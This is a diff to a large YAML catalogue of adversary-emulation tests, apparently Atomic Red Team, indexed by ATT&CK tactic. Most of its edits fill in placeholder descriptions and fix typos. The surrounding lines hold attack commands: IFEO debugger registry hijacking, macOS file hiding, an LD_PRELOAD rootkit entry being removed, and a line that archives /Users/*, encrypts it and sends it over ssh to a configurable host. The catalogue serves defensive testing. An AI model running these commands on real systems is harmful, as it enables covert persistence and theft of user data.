@@ -1125,7 +1125,7 @@ persistence:
           mkdir .hidden-directory
           echo "this file is hidden" > .hidden-directory/.hidden-file
     - name: Mac Hidden file
-      description: 'TODO
+      description: 'Hide a file on MacOS
 
 '
       supported_platforms:
@@ -1158,29 +1158,39 @@ persistence:
 
 '
     - name: Hidden files
-      description: 'Requieres Apple Dev Tools
+      description: 'Requires Apple Dev Tools
 
 '
       supported_platforms:
       - macos
+      input_arguments:
+        filename:
+          description: path of file to hide
+          type: path
+          default: "/tmp/evil"
       executor:
         name: sh
         command: 'setfile -a V #{filename}
 
 '
     - name: Hide a Directory
-      description: 'xxx
+      description: 'Hide a directory on MacOS
 
 '
       supported_platforms:
       - macos
+      input_arguments:
+        filename:
+          description: path of file to hide
+          type: path
+          default: "/tmp/evil"
       executor:
         name: sh
         command: 'chflags hidden #{filename}
 
 '
     - name: Show all hidden files
-      description: 'xxx
+      description: 'Show all hidden files on MacOS
 
 '
       supported_platforms:
@@ -1190,8 +1200,8 @@ persistence:
         command: 'defaults write com.apple.finder AppleShowAllFiles YES
 
 '
-    - name: Create visible Directories
-      description: 'xxx
+    - name: Create Visible Directories
+      description: 'Create visible directories on MacOS and Linux
 
 '
       supported_platforms:
@@ -1205,7 +1215,7 @@ persistence:
           ls
           ls visible-directory
     - name: Create hidden directories and files
-      description: 'xxx
+      description: 'Create hidden directories and files on Nix platforms
 
 '
       supported_platforms:
@@ -1550,7 +1560,7 @@ persistence:
       identifier: T1183
     atomic_tests:
     - name: IFEO Add Debugger
-      description: 'TODO
+      description: 'Leverage Global Flags Settings
 
 '
       supported_platforms:
@@ -1570,7 +1580,7 @@ persistence:
           File Execution Options\#{target_binary}" /v Debugger /d "#{payload_binary}"
 
 '
-    - name: IFEO GLobal Flags
+    - name: IFEO Global Flags
       description: 'Leverage Global Flags Settings
 
 '
@@ -1780,7 +1790,7 @@ persistence:
       identifier: T1160
     atomic_tests:
     - name: Launch Daemon
-      description: 'TODO
+      description: 'Utilize LaunchDaemon to launch `Hello World`
 
 '
       supported_platforms:
@@ -1963,7 +1973,7 @@ persistence:
       identifier: T1168
     atomic_tests:
     - name: Cron Job
-      description: 'TODO
+      description: 'Set a cron job
 
 '
       supported_platforms:
@@ -1982,7 +1992,7 @@ persistence:
 
 '
     - name: Cron Job
-      description: 'TODO
+      description: 'Manually set a cron job
 
 '
       supported_platforms:
@@ -2595,7 +2605,7 @@ persistence:
       identifier: T1150
     atomic_tests:
     - name: Plist Modification
-      description: 'TODO
+      description: 'Modify MacOS plist file in one of two directories
 
 '
       supported_platforms:
@@ -4238,11 +4248,6 @@ defense-evasion:
         [Additional Reference](http://www.labofapenetrationtester.com/2018/04/dcshadow.html)
       supported_platforms:
       - windows
-      input_arguments:
-        output_file:
-          description: TODO
-          type: todo
-          default: TODO
       executor:
         name: manual
         steps: |
@@ -4983,7 +4988,7 @@ defense-evasion:
           mkdir .hidden-directory
           echo "this file is hidden" > .hidden-directory/.hidden-file
     - name: Mac Hidden file
-      description: 'TODO
+      description: 'Hide a file on MacOS
 
 '
       supported_platforms:
@@ -5016,29 +5021,39 @@ defense-evasion:
 
 '
     - name: Hidden files
-      description: 'Requieres Apple Dev Tools
+      description: 'Requires Apple Dev Tools
 
 '
       supported_platforms:
       - macos
+      input_arguments:
+        filename:
+          description: path of file to hide
+          type: path
+          default: "/tmp/evil"
       executor:
         name: sh
         command: 'setfile -a V #{filename}
 
 '
     - name: Hide a Directory
-      description: 'xxx
+      description: 'Hide a directory on MacOS
 
 '
       supported_platforms:
       - macos
+      input_arguments:
+        filename:
+          description: path of file to hide
+          type: path
+          default: "/tmp/evil"
       executor:
         name: sh
         command: 'chflags hidden #{filename}
 
 '
     - name: Show all hidden files
-      description: 'xxx
+      description: 'Show all hidden files on MacOS
 
 '
       supported_platforms:
@@ -5048,8 +5063,8 @@ defense-evasion:
         command: 'defaults write com.apple.finder AppleShowAllFiles YES
 
 '
-    - name: Create visible Directories
-      description: 'xxx
+    - name: Create Visible Directories
+      description: 'Create visible directories on MacOS and Linux
 
 '
       supported_platforms:
@@ -5063,7 +5078,7 @@ defense-evasion:
           ls
           ls visible-directory
     - name: Create hidden directories and files
-      description: 'xxx
+      description: 'Create hidden directories and files on Nix platforms
 
 '
       supported_platforms:
@@ -5250,7 +5265,7 @@ defense-evasion:
       identifier: T1183
     atomic_tests:
     - name: IFEO Add Debugger
-      description: 'TODO
+      description: 'Leverage Global Flags Settings
 
 '
       supported_platforms:
@@ -5270,7 +5285,7 @@ defense-evasion:
           File Execution Options\#{target_binary}" /v Debugger /d "#{payload_binary}"
 
 '
-    - name: IFEO GLobal Flags
+    - name: IFEO Global Flags
       description: 'Leverage Global Flags Settings
 
 '
@@ -6491,7 +6506,7 @@ defense-evasion:
       identifier: T1150
     atomic_tests:
     - name: Plist Modification
-      description: 'TODO
+      description: 'Modify MacOS plist file in one of two directories
 
 '
       supported_platforms:
@@ -7039,17 +7054,6 @@ defense-evasion:
       executor:
         name: sh
         command: 'sudo modprobe #{rootkit_file}
-
-'
-    - name: LD_PRELOAD based Rootkit
-      description: 'LD_PRELOAD based Rootkit
-
-'
-      supported_platforms:
-      - linux
-      executor:
-        name: sh
-        command: 'export LD_PRELOAD=$PWD/#{rootkit_file}
 
 '
     - name: Windows Signed Driver Rootkit Test
@@ -8612,7 +8616,7 @@ privilege-escalation:
       identifier: T1183
     atomic_tests:
     - name: IFEO Add Debugger
-      description: 'TODO
+      description: 'Leverage Global Flags Settings
 
 '
       supported_platforms:
@@ -8632,7 +8636,7 @@ privilege-escalation:
           File Execution Options\#{target_binary}" /v Debugger /d "#{payload_binary}"
 
 '
-    - name: IFEO GLobal Flags
+    - name: IFEO Global Flags
       description: 'Leverage Global Flags Settings
 
 '
@@ -8725,7 +8729,7 @@ privilege-escalation:
       identifier: T1160
     atomic_tests:
     - name: Launch Daemon
-      description: 'TODO
+      description: 'Utilize LaunchDaemon to launch `Hello World`
 
 '
       supported_platforms:
@@ -8926,7 +8930,7 @@ privilege-escalation:
       identifier: T1150
     atomic_tests:
     - name: Plist Modification
-      description: 'TODO
+      description: 'Modify MacOS plist file in one of two directories
 
 '
       supported_platforms:
@@ -13321,7 +13325,7 @@ execution:
       identifier: T1168
     atomic_tests:
     - name: Cron Job
-      description: 'TODO
+      description: 'Set a cron job
 
 '
       supported_platforms:
@@ -13340,7 +13344,7 @@ execution:
 
 '
     - name: Cron Job
-      description: 'TODO
+      description: 'Manually set a cron job
 
 '
       supported_platforms:
@@ -15610,8 +15614,8 @@ lateral-movement:
       type: attack-pattern
       identifier: T1105
     atomic_tests:
-    - name: xxxx
-      description: 'xxxx
+    - name: rsync - scp - sftp remote file copy
+      description: 'Utilize rsync, scp and sftp to perform a remote file copy
 
 '
       supported_platforms:
@@ -15620,7 +15624,7 @@ lateral-movement:
       executor:
         name: bash
         command: |
-          ### TODO: Not sure how to handle commands that need to be run on multiple systems
+          ### FIX: Not sure how to handle commands that need to be run on multiple systems
 
           # Adversary System Configuration
           # Ensure SSH access has been configured for an adversary account
@@ -16547,9 +16551,8 @@ exfiltration:
       identifier: T1002
     atomic_tests:
     - name: Compress Data for Exfiltration With PowerShell
-      description: 'TODO
-
-'
+      description: "An adversary may compress data (e.g., sensitive documents) that
+        is collected prior to exfiltration \n"
       supported_platforms:
       - windows
       input_arguments:
@@ -16567,9 +16570,8 @@ exfiltration:
 
 '
     - name: Compress Data for Exfiltration With Rar
-      description: 'TODO
-
-'
+      description: "An adversary may compress data (e.g., sensitive documents) that
+        is collected prior to exfiltration \n"
       supported_platforms:
       - windows
       input_arguments:
@@ -16587,9 +16589,8 @@ exfiltration:
 
 '
     - name: Data Compressed - nix
-      description: 'TODO
-
-'
+      description: "An adversary may compress data (e.g., sensitive documents) that
+        is collected prior to exfiltration \n"
       supported_platforms:
       - linux
       - macos
@@ -16667,7 +16668,7 @@ exfiltration:
       identifier: T1022
     atomic_tests:
     - name: Data Encrypted
-      description: 'TODO
+      description: 'Encrypt data for exiltration
 
 '
       supported_platforms:
@@ -16738,11 +16739,6 @@ exfiltration:
       - centos
       - ubuntu
       - linux
-      input_arguments:
-        output_file:
-          description: TODO
-          type: todo
-          default: TODO
       executor:
         name: sh
         command: |
@@ -16833,6 +16829,19 @@ exfiltration:
       - centos
       - ubuntu
       - linux
+      input_arguments:
+        domain:
+          description: target SSH domain
+          type: url
+          default: target.example.com
+        user_name:
+          description: username for domain
+          type: string
+          default: atomic
+        password:
+          description: password for user
+          type: string
+          default: atomic
       executor:
         name: sh
         command: 'tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh
@@ -17066,8 +17075,8 @@ command-and-control:
       type: attack-pattern
       identifier: T1105
     atomic_tests:
-    - name: xxxx
-      description: 'xxxx
+    - name: rsync - scp - sftp remote file copy
+      description: 'Utilize rsync, scp and sftp to perform a remote file copy
 
 '
       supported_platforms:
@@ -17076,7 +17085,7 @@ command-and-control:
       executor:
         name: bash
         command: |
-          ### TODO: Not sure how to handle commands that need to be run on multiple systems
+          ### FIX: Not sure how to handle commands that need to be run on multiple systems
 
           # Adversary System Configuration
           # Ensure SSH access has been configured for an adversary account
